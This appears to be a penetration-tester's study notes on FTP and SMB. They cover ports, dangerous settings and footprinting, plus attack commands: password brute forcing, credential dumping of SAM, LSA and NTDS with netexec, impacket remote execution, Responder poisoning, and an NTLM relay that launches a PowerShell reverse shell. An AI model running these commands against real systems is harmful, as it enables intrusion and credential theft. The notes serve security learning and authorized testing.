# Content 
- [FTP](#ftp)
  - [Service Info](#service-info)
  - [Attacks](#attacks)   
- [SMB](#smb)



# FTP
File Transfer Protocol

## Service Info
### ports used  
- 21/TCP for control channel
- 20/TCP for data channel in active mode
- for passive mode the server tell the client which port to connect
### Dangerous Settings
| Setting                      | Description                                              |
|------------------------------|----------------------------------------------------------|
| anonymous_enable=YES         | Allowing anonymous login?                               |
| anon_upload_enable=YES       | Allowing anonymous to upload files?                     |
| anon_mkdir_write_enable=YES  | Allowing anonymous to create new directories?           |
| no_anon_password=YES         | Do not ask anonymous for password?                      |
| anon_root=/home/username/ftp| Directory for anonymous.                                 |
| write_enable=YES             | Allow the usage of FTP commands: STOR, DELE, RNFR, RNTO, MKD, RMD, APPE, and SITE? |

### Footprinting the Service
- nmap 
```bash
sudo nmap -sV -p21 -sC -A 10.129.14.136

sudo nmap -sV -p21 -sC -A 10.129.14.136 --script ftp*
```
### Service Interaction
- **Tools***
```bash
# ftp
ftp 10.129.14.136

# netcat
nc -nv 10.129.14.136 21

# telnet
telnet 10.129.14.136 21

# openssl
openssl s_client -connect 10.129.14.136:21 -starttls ftp
```
- **commands**

| Command | Description                                                                                               |
|---------|-----------------------------------------------------------------------------------------------------------|
| connect | Sets the remote host, and optionally the port, for file transfers.                                         |
| get     | Transfers a file or set of files from the remote host to the local host.                                     |
| put     | Transfers a file or set of files from the local host onto the remote host.                                   |
| quit    | Exits tftp.                                                                                                |
| status  | Shows the current status of tftp, including the current transfer mode (ascii or binary), connection status, time-out value, and so on. |
| verbose | Turns verbose mode, which displays additional information during file transfer, on or off.                  |

- **Download All Available Files**
```bash
wget -m --no-passive ftp://anonymous:anonymous@10.129.14.136
```
## Attacks 
### Bruteforce 
```bash
# hydra
hydra -l username -P /path/to/password-list.txt ftp://target-ip
hydra -L /path/to/usernames.txt -P /path/to/password-list.txt ftp://192.168.1.10

# medusa 
medusa -h target-ip -u username -P /path/to/password-list.txt -M ftp
medusa -h 192.168.1.10 -U /path/to/usernames.txt -P /path/to/password-list.txt -M ftp
```

### Anonymous Login
```bash
ftp target-ip
  Name (target-ip:your-username): anonymous
  Password: [press Enter or type any email as a password]
```

### CVEs
```bash
sudo nmap -sV -p21 -sC -A 10.129.14.136 --script ftp*
searchsploit 'ftp' # search for version 
```




# SMB
Server Message Block (SMB) is a client-server protocol that regulates access to files and entire directories and other network resources such as printers, routers, or interfaces released for the network

- `CIFS` was used as the same as SMB but now it's old and work on the same ports as SMB

## Service Info
### port used  
-  `OLD` 137, 138, and 139 TCP/UDP  on top of  `NetBIOS `
-  `NEW` 445 TCP on top of `microsoft-ds`

### Dangerous Settings
| Setting             | Description                                                   |
|---------------------|---------------------------------------------------------------|
| browseable = yes    | Allow listing available shares in the current share?          |
| read only = no      | Forbid the creation and modification of files?                |
| writable = yes      | Allow users to create and modify files?                       |
| guest ok = yes      | Allow connecting to the service without using a password?     |
| enable privileges = yes | Honor privileges assigned to specific SID?                 |
| create mask = 0777 | What permissions must be assigned to the newly created files? |
| directory mask = 0777 | What permissions must be assigned to the newly created directories? |
| logon script = script.sh | What script needs to be executed on the user's login?     |
| magic script = script.sh | Which script should be executed when the script gets closed? |
| magic output = script.out | Where the output of the magic script needs to be stored?   |


### Footprinting the Service
- nmap
```bash
 sudo nmap 10.129.14.128 -sV -sC -p139,445
```


### Service Interaction

#### **smbmap**
```bash
smbmap -H 10.129.202.5 -s sambashare
```

#### **smbclient**
```
# null session
smbclient -N -L //10.129.14.128
# using creds
smbclient //server78//publicfolder -U=user%password
```
- smb commands

| Command        | Description                                                  |
|----------------|--------------------------------------------------------------|
| `?`            | Displays a list of available commands or provides help.       |
| `allinfo`      | Displays detailed information about a file or directory.     |
| `cd`           | Changes the current working directory on the remote server.   |
| `get`          | Downloads a file from the remote server.                     |
| `put`          | Uploads a file to the remote server.                         |
| `ls`           | Lists the contents of the current directory on the server.   |
| `mkdir`        | Creates a new directory on the remote server.                |
| `pwd`          | Prints the current working directory on the server.          |
| `quit` (`q`)   | Exits the `smbclient` session.                               |
| RECURSE ON     | make any command recursive                                   |
| PROMPT OFF     | Turns off prompting, allowing commands like mget to process all files without asking for confirmation for each one. |
| mget *         |     download multiple files from an SMB share            |


#### rpcclient
```bash
# null session
rpcclient -U "" 10.129.14.128

# using creds
rpcclient -U "username%password" target-ip
```
- rpcclient commands

| Query               | Description                                                   |
|---------------------|---------------------------------------------------------------|
| srvinfo             | Server information.                                           |
| enumdomains         | Enumerate all domains that are deployed in the network.       |
| querydominfo        | Provides domain, server, and user information of deployed domains. |
| netshareenumall     | Enumerates all available shares.                              |
| netsharegetinfo \<share\> | Provides information about a specific share.               |
| enumdomusers        | Enumerates all domain users.                                  |
| queryuser \<RID\>     | Provides information about a specific user.                  |

## Attacks
### Bruteforce 

```bash
# metasploit
msf > use auxiliary/scanner/smb/smb_login

# hydra
hydra -l username -P /path/to/password-list.txt smb://target-ip
hydra -L /path/to/usernames.txt -P /path/to/password-list.txt smb://192.168.1.10

# medusa
medusa -h target-ip -u username -P /path/to/password-list.txt -M smbnt
medusa -h 192.168.1.10 -U /path/to/usernames.txt -P /path/to/password-list.txt -M smbnt
```
### Enumerating
```bash
# null session
## enum4linux
enum4linux -U 172.16.5.5  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
## rpcclient 
rpcclient -U "" -N 172.16.5.5
> enumdomusers 


# guest access or valid creds
netexec smb 172.16.5.5 -u "guest" -p "" --rid-brute  

# Logged-on Users
netexec smb 10.10.110.10 -u administrator -p 'Password123!' --loggedon-users


# using netexec you can enumrate 
--shares              enumerate shares and access
--interfaces          enumerate network interfaces
--no-write-check      Skip write check on shares (avoid leaving traces when missing delete permissions)
--filter-shares FILTER_SHARES [FILTER_SHARES ...]
                      Filter share by access, option 'read' 'write' or 'read,write'
--sessions            enumerate active sessions
--disks               enumerate disks
--loggedon-users-filter LOGGEDON_USERS_FILTER
                      only search for specific user, works with regex
--loggedon-users      enumerate logged on users
--users [USER ...]    enumerate domain users, if a user is specified than only its information is queried.
--groups [GROUP]      enumerate domain groups, if a group is specified than its members are enumerated
--computers [COMPUTER]
                      enumerate computer users
--local-groups [GROUP]
                      enumerate local groups, if a group is specified then its members are enumerated
--pass-pol            dump password policy
--rid-brute [MAX_RID]
                      enumerate users by bruteforcing RIDs

```

### RCE 
need admin priv
```
/usr/share/doc/python3-impacket/examples/psexec.py

/usr/share/doc/python3-impacket/examples/smbexec.py

/usr/share/doc/python3-impacket/examples/atexec.py

netexec smb 10.129.202.85 -u user.list -p password.list   -x 'whoami' --exec-method smbexec
```

### Credential Gathering

```bash
# AD admin | --local-auth  for local admin | any user with suitable pemssions
netexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam
netexec smb 10.10.110.17 -u administrator -p 'Password123!' --lsa
# AD admin
netexec smb 10.10.110.17 -u administrator -p 'Password123!' --ntds

/usr/share/doc/python3-impacket/examples/samrdump.py 10.129.14.128
```

### LLMNR/NBT-NS Poisoning
- for more info check (this)[https://github.com/kiro6/penetration-testing-notes/tree/main/Penetration%20Testing/Active%20Directory%20Enumeration%20%26%20Attacks#llmnrnbt-ns-poisoning]
- if we are in the same network we can pretend to be a smb server and catch the user hashes 
```
1) The local host file (C:\Windows\System32\Drivers\etc\hosts) will be checked for suitable records.
2) If no records are found, the machine switches to the local DNS cache, which keeps track of recently resolved names.
3) Is there no local DNS record? A query will be sent to the DNS server that has been configured.
4) If all else fails, the machine will issue a multicast query, requesting the IP address of the file share from other machines on the network.
```
- user mistyped a shared folder's name `\\mysharefoder\` instead of `\\mysharedfolder\` In that case, the machine will send a multicast query to all devices on the network

```
 responder -I <interface name>
```

### SMB relay attack
The target must not enforce or enable SMB signing.


- run responder
```
 responder -I <interface name>
```
- will capture credintials and pass it using techniques like `PtH` to another systems 
- [revshells](https://www.revshells.com/)
```shell
#  we need to set SMB to OFF in our responder configuration file (/etc/responder/Responder.conf).
cat /etc/responder/Responder.conf | grep 'SMB ='

# -t is the taregt we rely this to
impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146
impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e <poweshell base64 reverse shell>'

```

